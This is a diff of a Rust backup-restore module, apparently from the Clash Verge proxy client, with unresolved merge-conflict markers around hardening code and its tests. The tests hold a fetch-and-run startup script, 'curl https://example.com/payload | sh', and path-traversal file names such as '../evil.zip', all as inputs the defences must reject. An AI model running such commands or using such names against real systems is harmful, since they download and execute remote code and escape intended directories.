@@ -27,6 +27,110 @@ pub struct LocalBackupFile {
     pub content_length: u64,
 }
 
+<<<<<<< HEAD
+||||||| parent of de2a2013f (fix(backup): restore WebDAV archives through a private temp file)
+/// Accepts only a bare backup file name so it cannot escape its containing directory.
+fn sanitize_backup_filename(filename: &str) -> Result<&str> {
+    if filename.is_empty() {
+        bail!("Backup filename must not be empty");
+    }
+    if filename.chars().any(char::is_control) {
+        bail!("Backup filename must not contain control characters");
+    }
+    if filename == ".." || filename.contains('/') || filename.contains('\\') {
+        bail!("Backup filename must not contain path separators: {filename}");
+    }
+    if Path::new(filename).file_name() != Some(OsStr::new(filename)) {
+        bail!("Invalid backup filename: {filename}");
+    }
+    Ok(filename)
+}
+
+/// Resolves a backup file name inside `dir`, rejecting names and symlinks that escape it.
+fn resolve_within(dir: &Path, filename: &str) -> Result<PathBuf> {
+    let filename = sanitize_backup_filename(filename)?;
+    let canonical_dir = std::fs::canonicalize(dir)
+        .map_err(|err| anyhow!("Failed to resolve backup directory {}: {err}", dir.display()))?;
+    let path = canonical_dir.join(filename);
+    if !path.starts_with(&canonical_dir) {
+        bail!("Backup path escapes {}", canonical_dir.display());
+    }
+    // Follow an existing target so a symlink planted in the directory cannot redirect the operation.
+    if let Ok(resolved) = std::fs::canonicalize(&path)
+        && !resolved.starts_with(&canonical_dir)
+    {
+        bail!("Backup path escapes {}", canonical_dir.display());
+    }
+    Ok(path)
+}
+
+/// Drops `startup_script` from untrusted restored settings; it must be enabled again explicitly.
+fn strip_untrusted_startup_script(verge: &mut IVerge) -> bool {
+    verge.startup_script.take().is_some()
+}
+
+=======
+/// Accepts only a bare backup file name so it cannot escape its containing directory.
+fn sanitize_backup_filename(filename: &str) -> Result<&str> {
+    if filename.is_empty() {
+        bail!("Backup filename must not be empty");
+    }
+    if filename.chars().any(char::is_control) {
+        bail!("Backup filename must not contain control characters");
+    }
+    if filename == ".." || filename.contains('/') || filename.contains('\\') {
+        bail!("Backup filename must not contain path separators: {filename}");
+    }
+    if Path::new(filename).file_name() != Some(OsStr::new(filename)) {
+        bail!("Invalid backup filename: {filename}");
+    }
+    Ok(filename)
+}
+
+/// Resolves a backup file name inside `dir`, rejecting names and symlinks that escape it.
+fn resolve_within(dir: &Path, filename: &str) -> Result<PathBuf> {
+    let filename = sanitize_backup_filename(filename)?;
+    let canonical_dir = std::fs::canonicalize(dir)
+        .map_err(|err| anyhow!("Failed to resolve backup directory {}: {err}", dir.display()))?;
+    let path = canonical_dir.join(filename);
+    if !path.starts_with(&canonical_dir) {
+        bail!("Backup path escapes {}", canonical_dir.display());
+    }
+    // Follow an existing target so a symlink planted in the directory cannot redirect the operation.
+    if let Ok(resolved) = std::fs::canonicalize(&path)
+        && !resolved.starts_with(&canonical_dir)
+    {
+        bail!("Backup path escapes {}", canonical_dir.display());
+    }
+    Ok(path)
+}
+
+/// Drops `startup_script` from untrusted restored settings; it must be enabled again explicitly.
+fn strip_untrusted_startup_script(verge: &mut IVerge) -> bool {
+    verge.startup_script.take().is_some()
+}
+
+/// A remote listing name must never choose the local download path: a hostile or odd WebDAV
+/// entry named `verge.yaml` would otherwise overwrite (and the cleanup guard would delete) a
+/// live app file. Always restore through a fresh private temp archive.
+fn restore_temp_path() -> Result<PathBuf> {
+    let path = std::env::temp_dir().join(format!(
+        "clash-verge-restore-{}-{}.zip",
+        std::process::id(),
+        nanoid::nanoid!()
+    ));
+    let mut options = std::fs::OpenOptions::new();
+    options.write(true).create_new(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::OpenOptionsExt as _;
+        options.mode(0o600);
+    }
+    options.open(&path)?.sync_all()?;
+    Ok(path)
+}
+
+>>>>>>> de2a2013f (fix(backup): restore WebDAV archives through a private temp file)
 /// Reloads restored configs into memory while preserving WebDAV credentials.
 async fn finalize_restored_verge_config(
     webdav_url: Option<String>,
@@ -142,9 +246,18 @@ pub async fn restore_webdav_backup(filename: String) -> Result<()> {
     let webdav_username = verge_data.webdav_username.clone();
     let webdav_password = verge_data.webdav_password.clone();
 
+<<<<<<< HEAD
     let backup_storage_path = app_home_dir()
         .map_err(|e| anyhow::anyhow!("Failed to get app home dir: {e}"))?
         .join(filename.as_str());
+||||||| parent of de2a2013f (fix(backup): restore WebDAV archives through a private temp file)
+    let app_home = app_home_dir().map_err(|e| anyhow::anyhow!("Failed to get app home dir: {e}"))?;
+    let backup_storage_path = resolve_within(&app_home, &filename)?;
+    let filename = String::from(sanitize_backup_filename(&filename)?);
+=======
+    let filename = String::from(sanitize_backup_filename(&filename)?);
+    let backup_storage_path = restore_temp_path()?;
+>>>>>>> de2a2013f (fix(backup): restore WebDAV archives through a private temp file)
     let name = filename.to_string();
     backup::WebDavClient::global()
         .download(filename, backup_storage_path.clone())
@@ -376,3 +489,274 @@ pub async fn export_local_backup(filename: String, destination: String) -> Resul
         .map_err(|err| anyhow!("Failed to export backup file: {err:#}"))?;
     Ok(())
 }
+<<<<<<< HEAD
+||||||| parent of de2a2013f (fix(backup): restore WebDAV archives through a private temp file)
+
+#[cfg(test)]
+mod tests {
+    use super::{
+        ArchiveLimits, resolve_within, sanitize_backup_filename, strip_untrusted_startup_script, validate_zip_archive,
+    };
+    use crate::config::IVerge;
+
+    fn zip_archive(entries: &[(&str, &[u8])]) -> anyhow::Result<zip::ZipArchive<std::io::Cursor<Vec<u8>>>> {
+        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, content) in entries {
+            writer.start_file(*name, zip::write::SimpleFileOptions::default())?;
+            std::io::Write::write_all(&mut writer, content)?;
+        }
+        let bytes = writer.finish()?.into_inner();
+        Ok(zip::ZipArchive::new(std::io::Cursor::new(bytes))?)
+    }
+
+    #[test]
+    fn accepts_a_small_backup_archive() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("profiles/a.yaml", b"rules: []"), ("verge.yaml", b"mode: rule")])?;
+        validate_zip_archive(&mut archive, ArchiveLimits::default())?;
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_archives_with_too_many_entries() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("one.yaml", b"1"), ("two.yaml", b"2")])?;
+        let limits = ArchiveLimits {
+            max_entries: 1,
+            ..ArchiveLimits::default()
+        };
+        let err = validate_zip_archive(&mut archive, limits)
+            .err()
+            .ok_or_else(|| anyhow::anyhow!("archive with too many entries must be rejected"))?;
+        assert!(err.to_string().contains("entries"), "{err}");
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_archives_that_expand_beyond_the_size_limit() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("one.yaml", b"hello"), ("two.yaml", b"world")])?;
+        let limits = ArchiveLimits {
+            max_entries: 10,
+            max_uncompressed_bytes: 8,
+        };
+        let err = validate_zip_archive(&mut archive, limits)
+            .err()
+            .ok_or_else(|| anyhow::anyhow!("archive expanding past the limit must be rejected"))?;
+        assert!(err.to_string().contains("expands"), "{err}");
+        Ok(())
+    }
+
+    #[test]
+    fn restoring_a_backup_never_enables_the_startup_script() {
+        let mut verge = IVerge {
+            startup_script: Some("curl https://example.com/payload | sh".into()),
+            ..IVerge::default()
+        };
+
+        assert!(strip_untrusted_startup_script(&mut verge));
+        assert!(verge.startup_script.is_none());
+        assert!(!strip_untrusted_startup_script(&mut verge));
+    }
+
+    #[test]
+    fn rejects_backup_filenames_that_can_escape_the_backup_directory() {
+        for name in [
+            "",
+            "..",
+            "../evil.zip",
+            "..\\evil.zip",
+            "..\\..\\evil.zip",
+            "/tmp/evil.zip",
+            "C:\\evil.zip",
+            "profiles/evil.zip",
+            "profiles\\evil.zip",
+            "bad\nname.zip",
+            "bad\u{0}name.zip",
+        ] {
+            assert!(
+                sanitize_backup_filename(name).is_err(),
+                "{name:?} should be rejected as a backup filename"
+            );
+        }
+    }
+
+    #[test]
+    fn accepts_plain_backup_filenames() -> anyhow::Result<()> {
+        for name in [
+            "macos-backup-2026-01-01_00-00-00.zip",
+            "backup.zip",
+            ".hidden.zip",
+            "备份.zip",
+        ] {
+            assert_eq!(sanitize_backup_filename(name)?, name);
+        }
+        Ok(())
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn rejects_symlinks_that_escape_the_backup_directory() -> anyhow::Result<()> {
+        let root = std::env::temp_dir().join(format!("clash-verge-backup-paths-{}", nanoid::nanoid!()));
+        std::fs::create_dir_all(&root)?;
+        let parent = root
+            .parent()
+            .ok_or_else(|| anyhow::anyhow!("temporary directory has no parent"))?;
+        let outside = parent.join(format!("clash-verge-outside-{}.zip", nanoid::nanoid!()));
+        std::fs::write(&outside, b"outside")?;
+        std::os::unix::fs::symlink(&outside, root.join("link.zip"))?;
+
+        assert!(resolve_within(&root, "link.zip").is_err());
+        assert_eq!(
+            resolve_within(&root, "normal.zip")?,
+            std::fs::canonicalize(&root)?.join("normal.zip")
+        );
+
+        std::fs::remove_file(root.join("link.zip"))?;
+        std::fs::remove_dir_all(&root)?;
+        std::fs::remove_file(outside)?;
+        Ok(())
+    }
+}
+=======
+
+#[cfg(test)]
+mod tests {
+    use super::{
+        ArchiveLimits, resolve_within, restore_temp_path, sanitize_backup_filename, strip_untrusted_startup_script,
+        validate_zip_archive,
+    };
+    use crate::config::IVerge;
+
+    fn zip_archive(entries: &[(&str, &[u8])]) -> anyhow::Result<zip::ZipArchive<std::io::Cursor<Vec<u8>>>> {
+        let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
+        for (name, content) in entries {
+            writer.start_file(*name, zip::write::SimpleFileOptions::default())?;
+            std::io::Write::write_all(&mut writer, content)?;
+        }
+        let bytes = writer.finish()?.into_inner();
+        Ok(zip::ZipArchive::new(std::io::Cursor::new(bytes))?)
+    }
+
+    #[test]
+    fn accepts_a_small_backup_archive() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("profiles/a.yaml", b"rules: []"), ("verge.yaml", b"mode: rule")])?;
+        validate_zip_archive(&mut archive, ArchiveLimits::default())?;
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_archives_with_too_many_entries() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("one.yaml", b"1"), ("two.yaml", b"2")])?;
+        let limits = ArchiveLimits {
+            max_entries: 1,
+            ..ArchiveLimits::default()
+        };
+        let err = validate_zip_archive(&mut archive, limits)
+            .err()
+            .ok_or_else(|| anyhow::anyhow!("archive with too many entries must be rejected"))?;
+        assert!(err.to_string().contains("entries"), "{err}");
+        Ok(())
+    }
+
+    #[test]
+    fn rejects_archives_that_expand_beyond_the_size_limit() -> anyhow::Result<()> {
+        let mut archive = zip_archive(&[("one.yaml", b"hello"), ("two.yaml", b"world")])?;
+        let limits = ArchiveLimits {
+            max_entries: 10,
+            max_uncompressed_bytes: 8,
+        };
+        let err = validate_zip_archive(&mut archive, limits)
+            .err()
+            .ok_or_else(|| anyhow::anyhow!("archive expanding past the limit must be rejected"))?;
+        assert!(err.to_string().contains("expands"), "{err}");
+        Ok(())
+    }
+
+    #[test]
+    fn restoring_a_backup_never_enables_the_startup_script() {
+        let mut verge = IVerge {
+            startup_script: Some("curl https://example.com/payload | sh".into()),
+            ..IVerge::default()
+        };
+
+        assert!(strip_untrusted_startup_script(&mut verge));
+        assert!(verge.startup_script.is_none());
+        assert!(!strip_untrusted_startup_script(&mut verge));
+    }
+
+    #[test]
+    fn rejects_backup_filenames_that_can_escape_the_backup_directory() {
+        for name in [
+            "",
+            "..",
+            "../evil.zip",
+            "..\\evil.zip",
+            "..\\..\\evil.zip",
+            "/tmp/evil.zip",
+            "C:\\evil.zip",
+            "profiles/evil.zip",
+            "profiles\\evil.zip",
+            "bad\nname.zip",
+            "bad\u{0}name.zip",
+        ] {
+            assert!(
+                sanitize_backup_filename(name).is_err(),
+                "{name:?} should be rejected as a backup filename"
+            );
+        }
+    }
+
+    #[test]
+    fn accepts_plain_backup_filenames() -> anyhow::Result<()> {
+        for name in [
+            "macos-backup-2026-01-01_00-00-00.zip",
+            "backup.zip",
+            ".hidden.zip",
+            "备份.zip",
+        ] {
+            assert_eq!(sanitize_backup_filename(name)?, name);
+        }
+        Ok(())
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn rejects_symlinks_that_escape_the_backup_directory() -> anyhow::Result<()> {
+        let root = std::env::temp_dir().join(format!("clash-verge-backup-paths-{}", nanoid::nanoid!()));
+        std::fs::create_dir_all(&root)?;
+        let parent = root
+            .parent()
+            .ok_or_else(|| anyhow::anyhow!("temporary directory has no parent"))?;
+        let outside = parent.join(format!("clash-verge-outside-{}.zip", nanoid::nanoid!()));
+        std::fs::write(&outside, b"outside")?;
+        std::os::unix::fs::symlink(&outside, root.join("link.zip"))?;
+
+        assert!(resolve_within(&root, "link.zip").is_err());
+        assert_eq!(
+            resolve_within(&root, "normal.zip")?,
+            std::fs::canonicalize(&root)?.join("normal.zip")
+        );
+
+        std::fs::remove_file(root.join("link.zip"))?;
+        std::fs::remove_dir_all(&root)?;
+        std::fs::remove_file(outside)?;
+        Ok(())
+    }
+
+    #[test]
+    fn restore_download_paths_are_unique_private_and_not_live_app_files() -> anyhow::Result<()> {
+        let first = restore_temp_path()?;
+        let second = restore_temp_path()?;
+        assert_ne!(first, second);
+        assert_eq!(first.extension().and_then(std::ffi::OsStr::to_str), Some("zip"));
+
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt as _;
+            assert_eq!(std::fs::metadata(&first)?.permissions().mode() & 0o777, 0o600);
+        }
+
+        std::fs::remove_file(first)?;
+        std::fs::remove_file(second)?;
+        Ok(())
+    }
+}
+>>>>>>> de2a2013f (fix(backup): restore WebDAV archives through a private temp file)
